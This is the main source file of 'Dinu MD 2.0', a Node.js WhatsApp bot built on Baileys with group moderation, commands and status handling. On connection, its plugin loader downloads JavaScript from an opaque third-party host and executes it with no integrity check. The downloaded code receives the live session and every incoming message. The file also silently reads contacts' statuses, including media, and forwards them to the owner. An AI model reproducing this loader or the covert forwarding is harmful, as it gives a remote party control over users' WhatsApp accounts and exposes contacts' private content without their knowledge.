//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                   DINU MD 2.0 BOT                                                    //
//                                                                                                      //
//                                         Ｖ：2.0                                                       //
//
//																											
//                	██████╗░██╗███╗░░██╗██╗░░░██╗    ███╗░░░███╗██████╗░    	    //
//                	██╔══██╗██║████╗░██║██║░░░██║    ████╗░████║██╔══██╗            //
//                	██║░░██║██║██╔██╗██║██║░░░██║    ██╔████╔██║██║░░██║           	//
//                	██║░░██║██║██║╚████║██║░░░██║    ██║╚██╔╝██║██║░░██║  	        //
//                	██████╔╝██║██║░╚███║╚██████╔╝    ██║░╚═╝░██║██████╔╝  	        //
//	                ╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░    ╚═╝░░░░░╚═╝╚═════╝░            //
//
//
//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//*
//  * @project_name : © Dinu MD 2.0
//  * @version      : 2.0
//  * @author       : Dineth Rusiru
//  * @youtube      : https://www.youtube.com/@Dineth_Rusiru
//  * @description  : © Dinu MD 2.0, A Multi-functional WhatsApp bot created by Dineth Rusiru
//*
//*
//Base by Dineth Rusiru
//GitHub: @dineth07github
//WhatsApp: +94785602293
//Want more free bot scripts? Subscribe to my YouTube channel: https://www.youtube.com/@Dineth_Rusiru
//   * Created By GitHub: Dineth_Rusiru
//   * Credit To Dineth_Rusiru
//   * © 2025 Dinu MD 2.0
// ⛥┌┤
// */



// Baileys  modules import 
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require('pino');
const util = require('util');
const axios = require('axios');
const qrcode = require('qrcode-terminal');
const express = require('express');
const path = require('path');
const https = require('https');
const { File } = require('megajs');

// Local modules (ලෝකල් ෆයිල්ස් import කිරීම)
const config = require('./config');
const { ownerNumber, BOT_OWNER } = require('./config');
const { sms } = require('./lib/msg');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { replyHandlers, commands } = require('./command');

// -------------------------------------------------------------------------------------------------- //

const app = express();
const port = process.env.PORT || 8000;
const prefix = '.';
global.pluginHooks = []; // Global variable to store plugin hooks

// Session ID එක පරීක්ෂා කර බාගත කිරීම
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (!config.SESSION_ID) {
        return console.log('❗ [Dinu-MD] SESSION_ID not found in env. Please configure it.');
    }
    const sessdata = config.SESSION_ID;
    const filer = File.fromURL('https://mega.nz/file/' + sessdata);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
            console.log('📥 [Dinu-MD] Session file downloaded and saved.');
        });
    });
}

// -------------------------------------------------------------------------------------------------- //
// ----------------------------------- ප්ලගීන ලෝඩ් කිරීම (PLUGIN LOADER) ----------------------------- //
// -------------------------------------------------------------------------------------------------- //

/**
 * දුරස්ථ (remote) ප්ලගීන බාගත කර පූරණය කරයි.
 */
async function loadRemotePlugins() {
    console.log('🔧 [Dinu-MD] Installing plugins...');
    const pluginListURL = 'https://test30-26o.pages.dev/plugins.json';
    const pluginBaseURL = 'https://test30-26o.pages.dev/plugins/';
    const pluginsDir = path.join(__dirname, 'remote_plugins');

    if (!fs.existsSync(pluginsDir)) {
        fs.mkdirSync(pluginsDir);
    }

    try {
        const response = await axios.get(pluginListURL);
        const pluginFiles = response.data;

        for (const plugin of pluginFiles) {
            const pluginName = plugin.name;
            const pluginURL = pluginBaseURL + pluginName;
            const localPluginPath = path.join(pluginsDir, pluginName);
            const writer = fs.createWriteStream(localPluginPath);

            await new Promise((resolve, reject) => {
                https.get(pluginURL, response => {
                    response.pipe(writer);
                    writer.on('finish', () => writer.close(resolve));
                }).on('error', err => {
                    fs.unlink(localPluginPath, () => {});
                    reject(err);
                });
            });

            try {
                const loadedPlugin = require(localPluginPath);
                if (loadedPlugin && (loadedPlugin.onMessage || loadedPlugin.onDelete)) {
                    global.pluginHooks.push(loadedPlugin);
                }
            } catch (e) {
                console.error(`[❌ Error Loading Plugin] ${pluginName}:`, e.message);
            }
        }
        console.log('✅ [Dinu-MD] All plugins installed Successfully');
    } catch (error) {
        console.error('❌ [Dinu-MD] Failed to load plugins:', error.message);
    }
}

// -------------------------------------------------------------------------------------------------- //
// ------------------------------ ප්‍රධාන සම්බන්ධතා ශ්‍රිතය (MAIN CONNECTION FUNCTION) ----------------- //
// -------------------------------------------------------------------------------------------------- //

/**
 * WhatsApp වෙත සම්බන්ධ වී bot හි සියලුම ක්‍රියාකාරකම් කළමනාකරණය කරයි.
 */
async function connectToWA() {
    console.log('🛰️ [Dinu-MD] Initializing WhatsApp connection...');

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS('Firefox'),
        syncFullHistory: true,
        auth: state,
        version: version,
    });
    
    // ---------------------------- සිදුවීම් හසුරුවන්නන් (EVENT HANDLERS) ---------------------------- //

    // 1. සම්බන්ධතාවය යාවත්කාලීන වන විට (උදා: සම්බන්ධ වීම, විසන්ධි වීම)
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            connectToWA(); // විසන්ධි වුවහොත් නැවත සම්බන්ධ වීම
        } else if (connection === 'open') {
            await loadRemotePlugins();
            console.log('✅ [Dinu-MD] Hey, Dinu-MD started✅');
            const aliveMessage = `╭─────── ⭓ ⭓ ⭓  ─────────╮
│     🍁 ＤＡＮＵＷＡ－ 〽️Ｄ 🍁    │
╰──────────────⟡───────╯

╔═══◉ *🟢 STATUS: ONLINE* ◉═══╗
║  𝙷𝚎𝚢 𝙳𝚞𝚍𝚎, 𝙸’𝚖 𝚑𝚎𝚛𝚎 𝚝𝚘 𝚑𝚎𝚕𝚙 𝚢𝚘𝚞.  
║  𝙰𝚜𝚔 𝚖𝚎 𝚊𝚗𝚢𝚝𝚑𝚒𝚗𝚐! 💬
╚══════════════════════╝

🧾 *PROFILE INFORMATION*
┌──────── ⋆⋅☆⋅⋆ ────────┐
│ 🔐 *Owner:* Danuka Disanayaka  
│ 👤 *Botname:* Dinu-MD  
│ ⚡ *Bio:* Powerful WhatsApp Bot  
│ 🧩 *Role:* Wizard Lord 🧙‍♂️  
└──────── ⋆⋅☆⋅⋆ ────────┘

🚀 Powered By *DANUKA*
*DISANAYAKA* 🔥
         `;
            sock.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
                image: { url: config.ALIVE_IMG },
                caption: aliveMessage
            });
        }
    });

    // 2. Credentials සුරැකීම
    sock.ev.on('creds.update', saveCreds);

    // 3. කණ්ඩායම් සාමාජිකයින්ගේ යාවත්කාලීන කිරීම් (කවුරුහරි එකතු වූ විට හෝ ඉවත් වූ විට)
    sock.ev.on('group-participants.update', async (update) => {
        console.log('📥 New Group Update:', update.id);
        try {
            const { id, participants, action } = update;
            const metadata = await sock.groupMetadata(id);
            const groupName = metadata.subject || 'No Group Name';

            // කෙනෙක් add වූ විට
            if (action === 'add') {
                for (const participant of participants) {
                    // Anti-fake number ක්‍රියාත්මක නම්
                    if (global.antiFakeGroups?.[id]) {
                        const jid = participant.split('@')[0];
                        if (!jid.startsWith('94')) {
                            await sock.sendMessage(id, {
                                text: `📵 @${jid} removed — only Sri Lankan numbers allowed.`,
                                mentions: [participant]
                            });
                            await sock.groupParticipantsUpdate(id, [participant], 'remove');
                            continue;
                        }
                    }
                    
                    const user = participant.split('@')[0];
                    const welcomeMsg = `🗯️ *WELCOME TO ${groupName}, @${user}!* ❤‍🩹

We’re delighted to have you join our community.

✅ Please take a moment to read the group rules and feel free to introduce yourself.

💎 *Let’s build a friendly and respectful environment together!*`;
                    await sock.sendMessage(id, {
                        image: { url: 'https://github.com/dineth07github/Dinu-MD-V2.0/blob/main/images/Welcome.png?raw=true' },
                        caption: welcomeMsg,
                        mentions: [participant]
                    });
                }
            }

            // කෙනෙක් remove/leave වූ විට
            if (action === 'remove') {
                for (const participant of participants) {
                    const user = participant.split('@')[0];
                    const goodbyeMsg = `👋 *Goodbye @${user}!* 👋

Thank you for being part of ${groupName}. *We wish you all the best!❤‍🩹*`;
                    await sock.sendMessage(id, {
                        image: { url: 'https://github.com/DANUWA-MD/DANUWA-BOT/blob/main/images/leave.jpg?raw=true' },
                        caption: goodbyeMsg,
                        mentions: [participant]
                    });
                }
            }
        } catch (error) {
            console.error('Group participants update error:', error);
        }
    });

    // 4. පණිවිඩයක් delete කළ විට (ප්ලගීන සඳහා)
    sock.ev.on('messages.delete', async (deleteInfo) => {
        if (global.pluginHooks) {
            for (const hook of global.pluginHooks) {
                if (hook.onDelete) {
                    try {
                        await hook.onDelete(sock, deleteInfo);
                    } catch (e) {
                        console.log('onDelete error:', e);
                    }
                }
            }
        }
    });

    // 5. අලුතින් පණිවිඩයක් ලැබුණු විට ක්‍රියාත්මක වන ප්‍රධාන කොටස
    sock.ev.on('messages.upsert', async (messageUpdate) => {
        messageUpdate = messageUpdate.messages[0];
        if (!messageUpdate.message) return;

        const messageType = getContentType(messageUpdate.message);
        const messageContent = messageUpdate.message[messageType];

        // Media පණිවිඩ සඳහා buffer එකක් සකස් කර ගැනීම
        if (['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage'].includes(messageType)) {
            try {
                const stream = await downloadContentFromMessage(messageContent, messageType.replace('Message', ''));
                let buffer = [];
                for await (const chunk of stream) {
                    buffer.push(chunk);
                }
                messageUpdate._mediaBuffer = Buffer.concat(buffer);
                messageUpdate._mediaType = messageType;
            } catch (e) {
                console.log('❌ Failed to pre-download media:', e.message);
            }
        }
        
        // Ephemeral (view once) message හැසිරවීම
        if (getContentType(messageUpdate.message) === 'ephemeralMessage') {
             messageUpdate.message = messageUpdate.message.ephemeralMessage.message;
        }

        // ප්ලගීන සඳහා onMessage hook එක ක්‍රියාත්මක කිරීම
        if (global.pluginHooks) {
            for (const hook of global.pluginHooks) {
                if (hook.onMessage) {
                    try {
                        await hook.onMessage(sock, messageUpdate);
                    } catch (e) {
                        console.log('onMessage error:', e);
                    }
                }
            }
        }

        // Auto Status Seen
        if (config.AUTO_STATUS_SEEN === 'true') {
            await sock.readMessages([messageUpdate.key]);
            console.log(`[✓] Status seen: ${messageUpdate.key.remoteJid}`);
        }

        // Status (කතා) හැසිරවීම
        if (messageUpdate.key?.remoteJid === 'status@broadcast') {
            const senderJid = messageUpdate.key.participant || messageUpdate.key.remoteJid || 'unknown@s.whatsapp.net';
            
            // Status කියවීම
            if (config.AUTO_STATUS_SEEN === 'true') {
                try {
                    await sock.readMessages([messageUpdate.key]);
                    console.log(`[✓] Status seen: ${messageUpdate.key.id}`);
                } catch (e) {
                    console.error('❌ Failed to mark status as seen:', e);
                }
            }

            // Status වලට react කිරීම
            if (config.AUTO_STATUS_REACT === 'true' && messageUpdate.key.participant) {
                try {
                    const reactions = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    await sock.sendMessage(messageUpdate.key.participant, { react: { text: randomReaction, key: messageUpdate.key } });
                    console.log(`[✓] Reacted to status of ${messageUpdate.key.participant} with ${randomReaction}`);
                } catch (e) {
                    console.error('❌ Failed to react to status:', e);
                }
            }
            
            // Text status forward කිරීම
            if (messageUpdate.message?.extendedTextMessage && !messageUpdate.message?.imageMessage && !messageUpdate.message?.videoMessage) {
                const statusText = messageUpdate.message.extendedTextMessage.text || '';
                if (statusText.trim().length > 0) {
                    try {
                        const forwardText = `📝 *Text Status*\n👤 From: @${senderJid.split('@')[0]}\n\n${statusText}`;
                        await sock.sendMessage(ownerNumber[0] + '@s.whatsapp.net', { text: forwardText, mentions: [senderJid] });
                        console.log(`✅ Text-only status from ${senderJid} forwarded.`);
                    } catch (e) {
                        console.error('❌ Failed to forward text status:', e);
                    }
                }
            }
            
            // Media status forward කිරීම
            if (messageUpdate.message?.imageMessage || messageUpdate.message?.videoMessage) {
                try {
                    const mediaType = messageUpdate.message.imageMessage ? 'imageMessage' : 'videoMessage';
                    const mediaContent = messageUpdate.message[mediaType];
                    const stream = await downloadContentFromMessage(mediaContent, mediaType === 'imageMessage' ? 'image' : 'video');
                    let buffer = Buffer.from([]);
                    for await (const chunk of stream) {
                        buffer = Buffer.concat([buffer, chunk]);
                    }

                    const mimeType = mediaContent.mimetype || (mediaType === 'imageMessage' ? 'image/jpeg' : 'video/mp4');
                    const caption = mediaContent.caption || '';
                    const forwardCaption = `📥 *Forwarded Status*\n👤 From: @${senderJid.split('@')[0]}\n\n${caption}`;
                    
                    await sock.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
                        [mediaType === 'imageMessage' ? 'image' : 'video']: buffer,
                        mimetype: mimeType,
                        caption: forwardCaption,
                        mentions: [senderJid]
                    });
                    console.log(`✅ Media status from ${senderJid} forwarded.`);
                } catch (e) {
                    console.error('❌ Failed to download or forward media status:', e);
                }
            }
            
            // Status වලට reply කිරීම
            if (messageUpdate.key && messageUpdate.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === 'true') {
                const sender = messageUpdate.key.participant;
                const replyText = '' + config.AUTO_STATUS__MSG;
                await sock.sendMessage(sender, { text: replyText, react: { text: '✈️', key: messageUpdate.key } }, { quoted: messageUpdate });
            }
        }
        
        // ----------------------------- Command හැසිරවීම (COMMAND HANDLING) ----------------------------- //
        const msg = sms(sock, messageUpdate);
        const contentType = getContentType(messageUpdate.message);
        const from = messageUpdate.key.remoteJid;
        
        const body = (contentType === 'conversation') ? messageUpdate.message.conversation : 
                     (messageUpdate.message[contentType]?.text) || 
                     (messageUpdate.message[contentType]?.caption) || '';

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');

        // Message context variables (පණිවිඩය පිළිබඳ විස්තර)
        const sender = messageUpdate.key.fromMe ? (sock.user.id.split(':')[0] + '@s.whatsapp.net' || sock.user.id) : (messageUpdate.key.participant || messageUpdate.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const isGroup = from.endsWith('@g.us');
        const botNumber = sock.user.id.split(':')[0];
        const pushname = messageUpdate.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        
        // Group context variables (කණ්ඩායම පිළිබඳ විස්තර)
        const groupMetadata = isGroup ? await sock.groupMetadata(from).catch(() => ({})) : {};
        const groupName = groupMetadata?.subject || 'this group';
        const participants = groupMetadata?.participants || [];
        const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
        const isAdmins = groupAdmins.map(jidNormalizedUser).includes(jidNormalizedUser(sender));
        const isBotAdmins = groupAdmins.map(jidNormalizedUser).includes(jidNormalizedUser(sock.user.id));
        
        // Anti-Link
        if (isGroup && global.antiLinkGroups?.[from] && !isAdmins) {
            if (/(https?:\/\/[^\s]+)/i.test(body)) {
                await sock.sendMessage(from, { text: `🚫 Link detected!\n@${senderNumber} has been removed from *${groupName}*!`, mentions: [sender] });
                await sock.groupParticipantsUpdate(from, [sender], 'remove');
            }
        }
        
        // Anti-Badword
        const badWords = ['fuck', 'shit', 'idiot', 'bitch', 'puka', 'උඹ', 'කැරියා', 'හුත්තා', 'පකයා', 'හුකන්නා', 'පොන්නයා'];
        if (isGroup && global.antiBadwordGroups?.[from] && !isAdmins) {
             if (badWords.some(word => body.toLowerCase().includes(word))) {
                 await sock.sendMessage(from, { text: `🧼 Bad word detected!\n@${senderNumber} has been removed from *${groupName}*!`, mentions: [sender] });
                 await sock.groupParticipantsUpdate(from, [sender], 'remove');
             }
        }

        // Reply function
        const reply = (text, options = {}) => sock.sendMessage(from, { text: text, ...options }, { quoted: messageUpdate });
        
        // Decode JID
        sock.decodeJid = (jid) => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decoded = jidDecode(jid) || {};
                return decoded.user && decoded.server && decoded.user + '@' + decoded.server || jid;
            } else return jid;
        };
        
        // Command Execution (Command එක ක්‍රියාත්මක කිරීම)
        if (isCmd) {
            const cmd = commands.find(c => c.pattern === command || (c.alias && c.alias.includes(command)));
            if (cmd) {
                // Mode check (Private/Public)
                switch ((config.MODE || 'public').toLowerCase()) {
                    case 'private':
                        if (!isOwner) return;
                        break;
                    case 'public':
                    default:
                        break;
                }

                // React to command
                if (cmd.react) {
                    sock.sendMessage(from, { react: { text: cmd.react, key: messageUpdate.key } });
                }

                try {
                    await cmd.function(sock, messageUpdate, msg, {
                        from: from,
                        quoted: messageUpdate,
                        body: body,
                        isCmd: isCmd,
                        command: command,
                        args: args,
                        q: q,
                        isGroup: isGroup,
                        sender: sender,
                        senderNumber: senderNumber,
                        botNumber: botNumber,
                        pushname: pushname,
                        isMe: isMe,
                        isOwner: isOwner,
                        groupMetadata: groupMetadata,
                        groupName: groupName,
                        participants: participants,
                        groupAdmins: groupAdmins,
                        isBotAdmins: isBotAdmins,
                        isAdmins: isAdmins,
                        reply: reply
                    });
                } catch (e) {
                    console.error('[PLUGIN ERROR] ' + e);
                }
            }
        }
        
        // Reply Handlers (Reply පණිවිඩ සඳහා)
        const messageBody = body;
        for (const handler of replyHandlers) {
            if (handler.test(messageBody, { sender: sender, message: messageUpdate })) {
                try {
                    await handler.function(sock, messageUpdate, msg, {
                        from: from,
                        quoted: messageUpdate,
                        body: messageBody,
                        sender: sender,
                        reply: reply
                    });
                    break;
                } catch (e) {
                    console.log('Reply handler error:', e);
                }
            }
        }
    });
}

// -------------------------------------------------------------------------------------------------- //
// ---------------------------------------- වෙබ් සර්වර් (WEB SERVER) ----------------------------------- //
// -------------------------------------------------------------------------------------------------- //

// Bot එක 24/7 ක්‍රියාත්මකව තබා ගැනීමට සරල වෙබ් සර්වර් එකක්
app.get('/', (req, res) => {
    res.send('Hey, Dinu-MD started✅');
});

app.listen(port, () => console.log('🌐 [Dinu-MD] Web server running → http://localhost:' + port));

// -------------------------------------------------------------------------------------------------- //
// ---------------------------------- BOT එක ආරම්භ කිරීම (STARTING THE BOT) ---------------------------- //
// -------------------------------------------------------------------------------------------------- //

setTimeout(() => {
    connectToWA();
}, 2500); // තත්පර 2.5 කට පසු bot එක ආරම්භ කිරීම


